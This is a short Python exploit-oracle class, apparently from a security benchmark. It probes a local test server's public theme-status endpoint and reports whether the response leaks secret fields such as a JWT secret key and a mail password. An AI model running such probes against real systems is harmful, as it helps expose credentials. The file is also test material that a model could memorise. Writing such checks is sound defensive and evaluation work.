from mosaic.oracle.exploit import ExploitTest


class ThemeManifestSwapExploit(ExploitTest):
    def __init__(self, base_url: str = "http://localhost:39081"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "gin_theme_manifest_swap"

    def execute(self) -> tuple[bool, str]:
        resp = self.http_get("/status/theme")
        if not resp.ok:
            return False, f"theme status unavailable: HTTP {resp.status_code}"
        body = resp.text.lower()
        evidence = [m for m in ("other_script", "jwt_secret_key", "mail_pwd", "post_index_key") if m in body]
        if evidence:
            return True, "Public theme status leaked canonical manifest fields: " + ", ".join(evidence)
        return False, "Public theme status remained compact."
